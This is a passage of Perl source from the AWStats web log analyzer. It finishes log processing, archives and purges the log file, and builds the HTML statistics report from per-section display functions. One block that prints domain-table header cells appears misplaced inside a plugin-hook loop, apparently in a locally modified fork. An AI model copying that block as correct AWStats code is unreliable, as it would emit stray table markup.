						  . " _host_s:"
						  . ( scalar keys %_host_s )
						  . " _host_u:"
						  . ( scalar keys %_host_u ) . "\n";
						print " _url_p:"
						  . ( scalar keys %_url_p )
						  . " _url_k:"
						  . ( scalar keys %_url_k )
						  . " _url_e:"
						  . ( scalar keys %_url_e )
						  . " _url_x:"
						  . ( scalar keys %_url_x ) . "\n";
						print " _waithost_e:"
						  . ( scalar keys %_waithost_e )
						  . " _waithost_l:"
						  . ( scalar keys %_waithost_l )
						  . " _waithost_s:"
						  . ( scalar keys %_waithost_s )
						  . " _waithost_u:"
						  . ( scalar keys %_waithost_u ) . "\n";
					}
					&Read_History_With_TmpUpdate(
						$lastprocessedyear,
						$lastprocessedmonth,
						$lastprocessedday,
						$lastprocessedhour,
						1,
						1,
						"all",
						( $lastlinenb + $NbOfLinesParsed ),
						$lastlineoffset,
						&CheckSum($_)
					);
					&GetDelaySinceStart(1);
					$NbOfLinesShowsteps = 1;
				}
			}
			$counterforflushtest = 0;
		}

	}    # End of loop for processing new record.

	if ($Debug) {
		debug(
			" _host_p:"
			  . ( scalar keys %_host_p )
			  . " _host_h:"
			  . ( scalar keys %_host_h )
			  . " _host_k:"
			  . ( scalar keys %_host_k )
			  . " _host_l:"
			  . ( scalar keys %_host_l )
			  . " _host_s:"
			  . ( scalar keys %_host_s )
			  . " _host_u:"
			  . ( scalar keys %_host_u ) . "\n",
			1
		);
		debug(
			" _url_p:"
			  . ( scalar keys %_url_p )
			  . " _url_k:"
			  . ( scalar keys %_url_k )
			  . " _url_e:"
			  . ( scalar keys %_url_e )
			  . " _url_x:"
			  . ( scalar keys %_url_x ) . "\n",
			1
		);
		debug(
			" _waithost_e:"
			  . ( scalar keys %_waithost_e )
			  . " _waithost_l:"
			  . ( scalar keys %_waithost_l )
			  . " _waithost_s:"
			  . ( scalar keys %_waithost_s )
			  . " _waithost_u:"
			  . ( scalar keys %_waithost_u ) . "\n",
			1
		);
		debug(
			"End of processing log file (AWStats memory cache is TmpDNSLookup="
			  . ( scalar keys %TmpDNSLookup )
			  . " TmpBrowser="
			  . ( scalar keys %TmpBrowser )
			  . " TmpOS="
			  . ( scalar keys %TmpOS )
			  . " TmpRefererServer="
			  . ( scalar keys %TmpRefererServer )
			  . " TmpRobot="
			  . ( scalar keys %TmpRobot ) . ")",
			1
		);
	}

# Save current processed break section
# If lastprocesseddate > 0 means there is at least one approved new record in log or at least one existing history file
	if ( $lastprocesseddate > 0 )
	{
	    # TODO: Do not save if we are sure a flush was just already done
		# Get last line
		seek( LOG, $lastlineoffset, 0 );
		my $line = <LOG>;
		chomp $line;
		$line =~ s/\r$//;
		if ( !$NbOfLinesParsed ) 
		{
            # TODO If there was no lines parsed (log was empty), we only update LastUpdate line with YYYYMMDDHHMMSS 0 0 0 0 0
			&Read_History_With_TmpUpdate(
				$lastprocessedyear, $lastprocessedmonth,
				$lastprocessedday,  $lastprocessedhour,
				1,                  1,
				"all", ( $lastlinenb + $NbOfLinesParsed ),
				$lastlineoffset, &CheckSum($line)
			);
		}
		else {
			&Read_History_With_TmpUpdate(
				$lastprocessedyear, $lastprocessedmonth,
				$lastprocessedday,  $lastprocessedhour,
				1,                  1,
				"all", ( $lastlinenb + $NbOfLinesParsed ),
				$lastlineoffset, &CheckSum($line)
			);
		}
	}

	if ($Debug) { debug("Close log file \"$LogFile\""); }
	close LOG || error("Command for pipe '$LogFile' failed");

	# Process the Rename - Archive - Purge phase
	my $renameok  = 1;
	my $archiveok = 1;

	# Open Log file for writing if PurgeLogFile is on
	if ($PurgeLogFile) {
		if ($ArchiveLogRecords) {
			if ( $ArchiveLogRecords == 1 ) {    # For backward compatibility
				$ArchiveFileName = "$DirData/${PROG}_archive$FileSuffix.log";
			}
			else {
				$ArchiveFileName =
				  "$DirData/${PROG}_archive$FileSuffix."
				  . &Substitute_Tags($ArchiveLogRecords) . ".log";
			}
			open( LOG, "+<$LogFile" )
			  || error(
"Enable to archive log records of \"$LogFile\" into \"$ArchiveFileName\" because source can't be opened for read and write: $!<br />\n"
			  );
		}
		else {
			open( LOG, "+<$LogFile" );
		}
		binmode LOG;
	}

	# Rename all HISTORYTMP files into HISTORYTXT
	&Rename_All_Tmp_History();

	# Purge Log file if option is on and all renaming are ok
	if ($PurgeLogFile) {

		# Archive LOG file into ARCHIVELOG
		if ($ArchiveLogRecords) {
			if ($Debug) { debug("Start of archiving log file"); }
			open( ARCHIVELOG, ">>$ArchiveFileName" )
			  || error(
				"Couldn't open file \"$ArchiveFileName\" to archive log: $!");
			binmode ARCHIVELOG;
			while (<LOG>) {
				if ( !print ARCHIVELOG $_ ) { $archiveok = 0; last; }
			}
			close(ARCHIVELOG)
			  || error("Archiving failed during closing archive: $!");
			if ($SaveDatabaseFilesWithPermissionsForEveryone) {
				chmod 0666, "$ArchiveFileName";
			}
			if ($Debug) { debug("End of archiving log file"); }
		}

		# If rename and archive ok
		if ( $renameok && $archiveok ) {
			if ($Debug) { debug("Purge log file"); }
			my $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );
			my $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );
			my $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );
			truncate( LOG, 0 )
			  || warning(
"Warning: $bold$PROG$unbold couldn't purge logfile \"$bold$LogFile$unbold\".$br\nChange your logfile permissions to allow write for your web server CGI process or change PurgeLogFile=1 into PurgeLogFile=0 in configure file and think to purge sometimes manually your logfile (just after running an update process to not loose any not already processed records your log file contains)."
			  );
		}
		close(LOG);
	}

	if ( $DNSLookup == 1 && $DNSLookupAlreadyDone ) {

		# DNSLookup warning
		my $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );
		my $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );
		my $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );
		warning(
"Warning: $bold$PROG$unbold has detected that some hosts names were already resolved in your logfile $bold$DNSLookupAlreadyDone$unbold.$br\nIf DNS lookup was already made by the logger (web server), you should change your setup DNSLookup=$DNSLookup into DNSLookup=0 to increase $PROG speed."
		);
	}
	if ( $DNSLookup == 1 && $NbOfNewLines ) {

		# Save new DNS last update cache file
		Save_DNS_Cache_File( \%TmpDNSLookup, "$DirData/$DNSLastUpdateCacheFile",
			"$FileSuffix" );    # Save into file using FileSuffix
	}

	if ($EnableLockForUpdate) {

		# Remove lock
		&Lock_Update(0);

		# Restore signals handler
		$SIG{INT} = 'DEFAULT';    # 2
		                          #$SIG{KILL} = 'DEFAULT';	# 9
		                          #$SIG{TERM} = 'DEFAULT';	# 15
	}

}

# End of log processing if ($UPdateStats)

#---------------------------------------------------------------------
# SHOW REPORT
#---------------------------------------------------------------------

if ( scalar keys %HTMLOutput ) {

	debug( "YearRequired=$YearRequired, MonthRequired=$MonthRequired", 2 );
	debug( "DayRequired=$DayRequired, HourRequired=$HourRequired",     2 );

	# Define the NewLinkParams for main chart
	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)output(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	my $NewLinkTarget = '';
	if ($DetailedReportsOnNewWindows) {
		$NewLinkTarget = " target=\"awstatsbis\"";
	}
	if ( ( $FrameName eq 'mainleft' || $FrameName eq 'mainright' )
		&& $DetailedReportsOnNewWindows < 2 )
	{
		$NewLinkParams .= "&amp;framename=mainright";
		$NewLinkTarget = " target=\"mainright\"";
	}
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }

	if ( $FrameName ne 'mainleft' ) {

		# READING DATA
		#-------------
		&Init_HashArray();

		# Lecture des fichiers history / reading history file
		if ( $DatabaseBreak eq 'month' ) {
			for ( my $ix = 12 ; $ix >= 1 ; $ix-- ) {
				my $stringforload = '';
				my $monthix = sprintf( "%02s", $ix );
				if ( $MonthRequired eq 'all' || $monthix eq $MonthRequired ) {
					$stringforload = 'all';    # Read full history file
				}
				elsif ( ( $HTMLOutput{'main'} && $ShowMonthStats )
					|| $HTMLOutput{'alldays'} )
				{
					$stringforload =
					  'general time';          # Read general and time sections.
				}
				if ($stringforload) {

					# On charge fichier / file is loaded
					&Read_History_With_TmpUpdate( $YearRequired, $monthix, '',
						'', 0, 0, $stringforload );
				}
			}
		}
		if ( $DatabaseBreak eq 'day' ) {
			my $stringforload = 'all';
			my $monthix       = sprintf( "%02s", $MonthRequired );
			my $dayix         = sprintf( "%02s", $DayRequired );
			&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix, '',
				0, 0, $stringforload );
		}
		if ( $DatabaseBreak eq 'hour' ) {
			my $stringforload = 'all';
			my $monthix       = sprintf( "%02s", $MonthRequired );
			my $dayix         = sprintf( "%02s", $DayRequired );
			my $hourix        = sprintf( "%02s", $HourRequired );
			&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix,
				$hourix, 0, 0, $stringforload );
		}

	}

	# HTMLHeadSection
	if ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {
		print "<a name=\"top\"></a>\n\n";
		my $newhead = $HTMLHeadSection;
		$newhead =~ s/\\n/\n/g;
		print "$newhead\n";
		print "\n";
	}

	# Call to plugins' function AddHTMLBodyHeader
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyHeader'} } ) {
		my $function = "AddHTMLBodyHeader_$pluginname";
		&$function();
	}

	my $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );

	# TOP BAN
	#---------------------------------------------------------------------
	if ( $ShowMenu || $FrameName eq 'mainleft' ) {
		HTMLTopBanner($WIDTHMENU1);
	}

	# Call to plugins' function AddHTMLMenuHeader
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuHeader'} } ) {
		my $function = "AddHTMLMenuHeader_$pluginname";
		&$function();
	}

	# MENU (ON LEFT IF FRAME OR TOP)
	#---------------------------------------------------------------------
	if ( $ShowMenu || $FrameName eq 'mainleft' ) {
		HTMLMenu($NewLinkParams, $NewLinkTarget);
	}

	# Call to plugins' function AddHTMLMenuFooter
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuFooter'} } ) {
		my $function = "AddHTMLMenuFooter_$pluginname";
		&$function();
	}

	# Exit if left frame
	if ( $FrameName eq 'mainleft' ) {
		&html_end(0);
		exit 0;
	}

	

# TotalVisits TotalUnique TotalPages TotalHits TotalBytes TotalHostsKnown TotalHostsUnknown
	$TotalUnique = $TotalVisits = $TotalPages = $TotalHits = $TotalBytes = 0;
	$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;
	$TotalHostsKnown = $TotalHostsUnknown = 0;
	my $beginmonth = $MonthRequired;
	my $endmonth   = $MonthRequired;
	if ( $MonthRequired eq 'all' ) { $beginmonth = 1; $endmonth = 12; }
	for ( my $month = $beginmonth ; $month <= $endmonth ; $month++ ) {
		my $monthix = sprintf( "%02s", $month );
		$TotalHostsKnown += $MonthHostsKnown{ $YearRequired . $monthix }
		  || 0;    # Wrong in year view
		$TotalHostsUnknown += $MonthHostsUnknown{ $YearRequired . $monthix }
		  || 0;    # Wrong in year view
		$TotalUnique += $MonthUnique{ $YearRequired . $monthix }
		  || 0;    # Wrong in year view
		$TotalVisits += $MonthVisits{ $YearRequired . $monthix }
		  || 0;    # Not completely true
		$TotalPages += $MonthPages{ $YearRequired . $monthix } || 0;
		$TotalHits  += $MonthHits{ $YearRequired . $monthix }  || 0;
		$TotalBytes += $MonthBytes{ $YearRequired . $monthix } || 0;
		$TotalNotViewedPages += $MonthNotViewedPages{ $YearRequired . $monthix }
		  || 0;
		$TotalNotViewedHits += $MonthNotViewedHits{ $YearRequired . $monthix }
		  || 0;
		$TotalNotViewedBytes += $MonthNotViewedBytes{ $YearRequired . $monthix }
		  || 0;
	}

	# TotalHitsErrors TotalBytesErrors
	$TotalHitsErrors  = 0;
	my $TotalBytesErrors = 0;
	foreach ( keys %_errors_h ) {

		#		print "xxxx".$_." zzz".$_errors_h{$_};
		$TotalHitsErrors  += $_errors_h{$_};
		$TotalBytesErrors += $_errors_k{$_};
	}

# TotalEntries (if not already specifically counted, we init it from _url_e hash table)
	if ( !$TotalEntries ) {
		foreach ( keys %_url_e ) { $TotalEntries += $_url_e{$_}; }
	}

# TotalExits (if not already specifically counted, we init it from _url_x hash table)
	if ( !$TotalExits ) {
		foreach ( keys %_url_x ) { $TotalExits += $_url_x{$_}; }
	}

# TotalBytesPages (if not already specifically counted, we init it from _url_k hash table)
	if ( !$TotalBytesPages ) {
		foreach ( keys %_url_k ) { $TotalBytesPages += $_url_k{$_}; }
	}

# TotalKeyphrases (if not already specifically counted, we init it from _keyphrases hash table)
	if ( !$TotalKeyphrases ) {
		foreach ( keys %_keyphrases ) { $TotalKeyphrases += $_keyphrases{$_}; }
	}

# TotalKeywords (if not already specifically counted, we init it from _keywords hash table)
	if ( !$TotalKeywords ) {
		foreach ( keys %_keywords ) { $TotalKeywords += $_keywords{$_}; }
	}

# TotalSearchEnginesPages (if not already specifically counted, we init it from _se_referrals_p hash table)
	if ( !$TotalSearchEnginesPages ) {
		foreach ( keys %_se_referrals_p ) {
			$TotalSearchEnginesPages += $_se_referrals_p{$_};
		}
	}

# TotalSearchEnginesHits (if not already specifically counted, we init it from _se_referrals_h hash table)
	if ( !$TotalSearchEnginesHits ) {
		foreach ( keys %_se_referrals_h ) {
			$TotalSearchEnginesHits += $_se_referrals_h{$_};
		}
	}

# TotalRefererPages (if not already specifically counted, we init it from _pagesrefs_p hash table)
	if ( !$TotalRefererPages ) {
		foreach ( keys %_pagesrefs_p ) {
			$TotalRefererPages += $_pagesrefs_p{$_};
		}
	}

# TotalRefererHits (if not already specifically counted, we init it from _pagesrefs_h hash table)
	if ( !$TotalRefererHits ) {
		foreach ( keys %_pagesrefs_h ) {
			$TotalRefererHits += $_pagesrefs_h{$_};
		}
	}

# TotalDifferentPages (if not already specifically counted, we init it from _url_p hash table)
	$TotalDifferentPages ||= scalar keys %_url_p;

# TotalDifferentKeyphrases (if not already specifically counted, we init it from _keyphrases hash table)
	$TotalDifferentKeyphrases ||= scalar keys %_keyphrases;

# TotalDifferentKeywords (if not already specifically counted, we init it from _keywords hash table)
	$TotalDifferentKeywords ||= scalar keys %_keywords;

# TotalDifferentSearchEngines (if not already specifically counted, we init it from _se_referrals_h hash table)
	$TotalDifferentSearchEngines ||= scalar keys %_se_referrals_h;

# TotalDifferentReferer (if not already specifically counted, we init it from _pagesrefs_h hash table)
	$TotalDifferentReferer ||= scalar keys %_pagesrefs_h;

# Define firstdaytocountaverage, lastdaytocountaverage, firstdaytoshowtime, lastdaytoshowtime
	my $firstdaytocountaverage =
	  $nowyear . $nowmonth . "01";    # Set day cursor to 1st day of month
	my $firstdaytoshowtime =
	  $nowyear . $nowmonth . "01";    # Set day cursor to 1st day of month
	my $lastdaytocountaverage =
	  $nowyear . $nowmonth . $nowday;    # Set day cursor to today
	my $lastdaytoshowtime =
	  $nowyear . $nowmonth . "31";       # Set day cursor to last day of month
	if ( $MonthRequired eq 'all' ) {
		$firstdaytocountaverage =
		  $YearRequired
		  . "0101";    # Set day cursor to 1st day of the required year
	}
	if ( ( $MonthRequired ne $nowmonth && $MonthRequired ne 'all' )
		|| $YearRequired ne $nowyear )
	{
		if ( $MonthRequired eq 'all' ) {
			$firstdaytocountaverage =
			  $YearRequired
			  . "0101";    # Set day cursor to 1st day of the required year
			$firstdaytoshowtime =
			  $YearRequired . "1201"
			  ;    # Set day cursor to 1st day of last month of required year
			$lastdaytocountaverage =
			  $YearRequired
			  . "1231";    # Set day cursor to last day of the required year
			$lastdaytoshowtime =
			  $YearRequired . "1231"
			  ;    # Set day cursor to last day of last month of required year
		}
		else {
			$firstdaytocountaverage =
			    $YearRequired
			  . $MonthRequired
			  . "01";    # Set day cursor to 1st day of the required month
			$firstdaytoshowtime =
			    $YearRequired
			  . $MonthRequired
			  . "01";    # Set day cursor to 1st day of the required month
			$lastdaytocountaverage =
			    $YearRequired
			  . $MonthRequired
			  . "31";    # Set day cursor to last day of the required month
			$lastdaytoshowtime =
			    $YearRequired
			  . $MonthRequired
			  . "31";    # Set day cursor to last day of the required month
		}
	}
	if ($Debug) {
		debug(
"firstdaytocountaverage=$firstdaytocountaverage, lastdaytocountaverage=$lastdaytocountaverage",
			1
		);
		debug(
"firstdaytoshowtime=$firstdaytoshowtime, lastdaytoshowtime=$lastdaytoshowtime",
			1
		);
	}

	# Call to plugins' function AddHTMLContentHeader
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLContentHeader'} } )
		{
			# to add unique visitors & number of visits, by J Ruano @ CAPSiDE
			if ( $ShowDomainsStats =~ /U/i ) {
				print "<th bgcolor=\"#$color_u\" width=\"80\">" . _t("Unique visitors") . "</th>";
			}
			if ( $ShowDomainsStats =~ /V/i ) {
				print "<th bgcolor=\"#$color_v\" width=\"80\">" . _t("Visits") . "</th>";
			}

			my $function = "AddHTMLContentHeader_$pluginname";
			&$function();
		}

	# Output individual frames or static pages for specific sections
	#-----------------------
	if ( scalar keys %HTMLOutput == 1 ) {

		if ( $HTMLOutput{'alldomains'} ) {
			&HTMLShowDomains();
		}
		if ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {
			&HTMLShowHosts();
		}
		if ( $HTMLOutput{'unknownip'} ) {
			&HTMLShowHostsUnknown();
		}
		if ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {
			&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );
			&html_end(1);
		}
		if ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {
			&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );
			&html_end(1);
		}
		if ( $HTMLOutput{'alllogins'} || $HTMLOutput{'lastlogins'} ) {
			&HTMLShowLogins();
		}
		if ( $HTMLOutput{'allrobots'} || $HTMLOutput{'lastrobots'} ) {
			&HTMLShowRobots();
		}
		if (   $HTMLOutput{'urldetail'}
			|| $HTMLOutput{'urlentry'}
			|| $HTMLOutput{'urlexit'} )
		{
			&HTMLShowURLDetail();
		}
		if ( $HTMLOutput{'unknownos'} ) {
			&HTMLShowOSUnknown($NewLinkTarget);
		}
		if ( $HTMLOutput{'unknownbrowser'} ) {
			&HTMLShowBrowserUnknown($NewLinkTarget);
		}
		if ( $HTMLOutput{'osdetail'} ) {
			&HTMLShowOSDetail();
		}
		if ( $HTMLOutput{'browserdetail'} ) {
			&HTMLShowBrowserDetail();
		}
		if ( $HTMLOutput{'refererse'} ) {
			&HTMLShowReferers($NewLinkTarget);
		}
		if ( $HTMLOutput{'refererpages'} ) {
			&HTMLShowRefererPages($NewLinkTarget);
		}
		if ( $HTMLOutput{'keyphrases'} ) {
			&HTMLShowKeyPhrases($NewLinkTarget);
		}
		if ( $HTMLOutput{'keywords'} ) {
			&HTMLShowKeywords($NewLinkTarget);
		}
		if ( $HTMLOutput{'downloads'} ) {
			&HTMLShowDownloads();
		}
		foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
			if ( $HTMLOutput{"errors$code"} ) {
				&HTMLShowErrorCodes($code);
			}
		}

		# BY EXTRA SECTIONS
		#----------------------------
		HTMLShowExtraSections();
		
		if ( $HTMLOutput{'info'} ) {
			# TODO Not yet available
			print "$Center<a name=\"info\">&nbsp;</a><br />";
			&html_end(1);
		}

		# Print any plugins that have individual pages
		# TODO - change name, graph isn't so descriptive
		my $htmloutput = '';
		foreach my $key ( keys %HTMLOutput ) { $htmloutput = $key; }
		if ( $htmloutput =~ /^plugin_(\w+)$/ ) {
			my $pluginname = $1;
			print "$Center<a name=\"plugin_$pluginname\">&nbsp;</a><br />";
			my $function = "AddHTMLGraph_$pluginname";
			&$function();
			&html_end(1);
		}
	}

	# Output main page
	#-----------------
	if ( $HTMLOutput{'main'} ) {
		
		# Calculate averages
		my $max_p = 0;
		my $max_h = 0;
		my $max_k = 0;
		my $max_v = 0;
		my $average_nb = 0;
		foreach my $daycursor ($firstdaytocountaverage .. $lastdaytocountaverage )
		{
			$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
			my $year  = $1;
			my $month = $2;
			my $day   = $3;
			if ( !DateIsValid( $day, $month, $year ) ) {
				next;
			}                 # If not an existing day, go to next
			$average_nb++;    # Increase number of day used to count
			$AverageVisits += ( $DayVisits{$daycursor} || 0 );
			$AveragePages += ( $DayPages{$daycursor}  || 0 );
			$AverageHits += ( $DayHits{$daycursor}   || 0 );
			$AverageBytes += ( $DayBytes{$daycursor}  || 0 );
		}
		if ($average_nb) {
			$AverageVisits = $AverageVisits / $average_nb;
			$AveragePages = $AveragePages / $average_nb;
			$AverageHits = $AverageHits / $average_nb;
			$AverageBytes = $AverageBytes / $average_nb;
			if ( $AverageVisits > $max_v ) { $max_v = $AverageVisits; }
			#if ($average_p > $max_p) { $max_p=$average_p; }
			if ( $AverageHits > $max_h ) { $max_h = $AverageHits; }
			if ( $AverageBytes > $max_k ) { $max_k = $AverageBytes; }
		}
		else {
			$AverageVisits = "?";
			$AveragePages = "?";
			$AverageHits = "?";
			$AverageBytes = "?";
		}

		# SUMMARY
		#---------------------------------------------------------------------
		if ($ShowSummary) {
			&HTMLMainSummary();
		}

		# BY MONTH
		#---------------------------------------------------------------------
		if ($ShowMonthStats) {
			&HTMLMainMonthly();
		}

		print "\n<a name=\"when\">&nbsp;</a>\n\n";

		# BY DAY OF MONTH
		#---------------------------------------------------------------------
		if ($ShowDaysOfMonthStats) {
			&HTMLMainDaily($firstdaytocountaverage, $lastdaytocountaverage,
						  $firstdaytoshowtime, $lastdaytoshowtime);
		}

		# BY DAY OF WEEK
		#-------------------------
		if ($ShowDaysOfWeekStats) {
			&HTMLMainDaysofWeek($firstdaytocountaverage, $lastdaytocountaverage, $NewLinkParams, $NewLinkTarget);
		}

		# BY HOUR
		#----------------------------
		if ($ShowHoursStats) {
			&HTMLMainHours($NewLinkParams, $NewLinkTarget);
		}

		print "\n<a name=\"who\">&nbsp;</a>\n\n";

		# BY COUNTRY/DOMAIN
		#---------------------------
		if ($ShowDomainsStats) {
			&HTMLMainCountries($NewLinkParams, $NewLinkTarget);
		}

		# BY HOST/VISITOR
		#--------------------------
		if ($ShowHostsStats) {
			&HTMLMainHosts($NewLinkParams, $NewLinkTarget);
		}

		# BY SENDER EMAIL
		#----------------------------
		if ($ShowEMailSenders) {
			&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );
		}

		# BY RECEIVER EMAIL
		#----------------------------
		if ($ShowEMailReceivers) {
			&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );
		}

		# BY LOGIN
		#----------------------------
		if ($ShowAuthenticatedUsers) {
			&HTMLMainLogins($NewLinkParams, $NewLinkTarget);
		}

		# BY ROBOTS
		#----------------------------
		if ($ShowRobotsStats) {
			&HTMLMainRobots($NewLinkParams, $NewLinkTarget);
		}

		# BY WORMS
		#----------------------------
		if ($ShowWormsStats) {
			&HTMLMainWorms();
		}

		print "\n<a name=\"how\">&nbsp;</a>\n\n";

		# BY SESSION
		#----------------------------
		if ($ShowSessionsStats) {
			&HTMLMainSessions();
		}

		# BY FILE TYPE
		#-------------------------
		if ($ShowFileTypesStats) {
			&HTMLMainFileType($NewLinkParams, $NewLinkTarget);
		}

		# BY FILE SIZE
		#-------------------------
		if ($ShowFileSizesStats) {
			&HTMLMainFileSize();
		}

                # BY REQUEST TIME
                #-------------------------
                if ($ShowRequestTimesStats) {
                        &HTMLMainRequestTime();
                }
		
		# BY DOWNLOADS
		#-------------------------
		if ($ShowDownloadsStats) {
			&HTMLMainDownloads($NewLinkParams, $NewLinkTarget);
		}

		# BY PAGE
		#-------------------------
		if ($ShowPagesStats) {
			&HTMLMainPages($NewLinkParams, $NewLinkTarget);
		}

		# BY OS
		#----------------------------
		if ($ShowOSStats) {
			&HTMLMainOS($NewLinkParams, $NewLinkTarget);
		}

		# BY BROWSER
		#----------------------------
		if ($ShowBrowsersStats) {
			&HTMLMainBrowsers($NewLinkParams, $NewLinkTarget);
		}

		# BY SCREEN SIZE
		#----------------------------
		if ($ShowScreenSizeStats) {
			&HTMLMainScreenSize();
		}

		print "\n<a name=\"refering\">&nbsp;</a>\n\n";

		# BY REFERENCE
		#---------------------------
		if ($ShowOriginStats) {
			&HTMLMainReferrers($NewLinkParams, $NewLinkTarget);
		}

		print "\n<a name=\"keys\">&nbsp;</a>\n\n";

		# BY SEARCH KEYWORDS AND/OR KEYPHRASES
		#-------------------------------------
		if ($ShowKeyphrasesStats || $ShowKeywordsStats){
			&HTMLMainKeys($NewLinkParams, $NewLinkTarget);
		}	

		print "\n<a name=\"other\">&nbsp;</a>\n\n";

		# BY MISC
		#----------------------------
		if ($ShowMiscStats) {
			&HTMLMainMisc();
		}

		# BY HTTP STATUS
		#----------------------------
		if ($ShowHTTPErrorsStats) {
			&HTMLMainHTTPStatus($NewLinkParams, $NewLinkTarget);
		}

		# BY SMTP STATUS
		#----------------------------
		if ($ShowSMTPErrorsStats) {
			&HTMLMainSMTPStatus($NewLinkParams, $NewLinkTarget);
		}

		# BY CLUSTER
		#----------------------------
		if ($ShowClusterStats) {
			&HTMLMainCluster($NewLinkParams, $NewLinkTarget);
		}

		# BY EXTRA SECTIONS
		#----------------------------
		foreach my $extranum ( 1 .. @ExtraName - 1 ) {
			&HTMLMainExtra($NewLinkParams, $NewLinkTarget, $extranum);
		}

		# close the HTML page
		&html_end(1);
	}
}
else {
	print "Jumped lines in file: $lastlinenb\n";
	if ($lastlinenb) { print " Found $lastlinenb already parsed records.\n"; }
	print "Parsed lines in file: $NbOfLinesParsed\n";
	print " Found $NbOfLinesDropped dropped records,\n";
	print " Found $NbOfLinesComment comments,\n";
 	print " Found $NbOfLinesBlank blank records,\n";
	print " Found $NbOfLinesCorrupted corrupted records,\n";
	print " Found $NbOfOldLines old records,\n";
	print " Found $NbOfNewLines new qualified records.\n";
}
} # 结束 unless ($TEST_MODE)

#sleep 10;

0;    # Do not remove this line

#-------------------------------------------------------
# ALGORITHM SUMMARY
#
# Read_Config();
# Check_Config() and Init variables
# if 'frame not index'
#	&Read_Language_Data($Lang);
#	if 'frame not mainleft'
#		&Read_Ref_Data();
#		&Read_Plugins();
# html_head
#
# If 'migrate'
#   We create/update tmp file with
#     &Read_History_With_TmpUpdate(year,month,day,hour,UPDATE,NOPURGE,"all");
#   Rename the tmp file
#   html_end
#   Exit
# End of 'migrate'
#
# Get last history file name
# Get value for $LastLine $LastLineNumber $LastLineOffset $LastLineChecksum with
#	&Read_History_With_TmpUpdate(lastyearbeforeupdate,lastmonthbeforeupdate,lastdaybeforeupdate,lasthourbeforeupdate,NOUPDATE,NOPURGE,"general");
#
# &Init_HashArray()
#
# If 'update'
#   Loop on each new line in log file
#     lastlineoffset=lastlineoffsetnext; lastlineoffsetnext=file pointer position
#     If line corrupted, skip --> next on loop
#	  Drop wrong virtual host --> next on loop
#     Drop wrong method/protocol --> next on loop
#     Check date --> next on loop
#     If line older than $LastLine, skip --> next on loop
#     So it's new line
#     $LastLine = time or record
#     Skip if url is /robots.txt --> next on loop
#     Skip line for @SkipHosts --> next on loop
#     Skip line for @SkipFiles --> next on loop
#     Skip line for @SkipUserAgent --> next on loop
#     Skip line for not @OnlyHosts --> next on loop
#     Skip line for not @OnlyUsers --> next on loop
#     Skip line for not @OnlyFiles --> next on loop
#     Skip line for not @OnlyUserAgent --> next on loop
#     So it's new line approved
#     If other month/year, create/update tmp file and purge data arrays with
#       &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,"all",lastlinenb,lastlineoffset,CheckSum($_));
#     Define a clean Url and Query (set urlwithnoquery, tokenquery and standalonequery and $field[$pos_url])
#     Define PageBool and extension
#     Analyze: Misc tracker --> complete %misc
#     Analyze: Hit on favorite icon --> complete %_misc, countedtraffic=1 (not counted anywhere)
#     If (!countedtraffic) Analyze: Worms --> complete %_worms, countedtraffic=2
#     If (!countedtraffic) Analyze: Status code --> complete %_error_, %_sider404, %_referrer404 --> countedtraffic=3
#     If (!countedtraffic) Analyze: Robots known --> complete %_robot, countedtraffic=4
#     If (!countedtraffic) Analyze: Robots unknown on robots.txt --> complete %_robot, countedtraffic=5
#     If (!countedtraffic) Analyze: File types - Compression
#     If (!countedtraffic) Analyze: Date - Hour - Pages - Hits - Kilo
#     If (!countedtraffic) Analyze: Login
#     If (!countedtraffic) Do DNS Lookup
#     If (!countedtraffic) Analyze: Country
#     If (!countedtraffic) Analyze: Host - Url - Session
#     If (!countedtraffic) Analyze: Browser - OS
#     If (!countedtraffic) Analyze: Referer
#     If (!countedtraffic) Analyze: EMail
#     Analyze: Cluster
#     Analyze: Extra (must be after 'Define a clean Url and Query')
#     If too many records, we flush data arrays with
#       &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,"all",lastlinenb,lastlineoffset,CheckSum($_));
#   End of loop
#
#   Create/update tmp file
#	  Seek to lastlineoffset in logfile to read and get last line into $_
#	  &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,"all",lastlinenb,lastlineoffset,CheckSum($_))
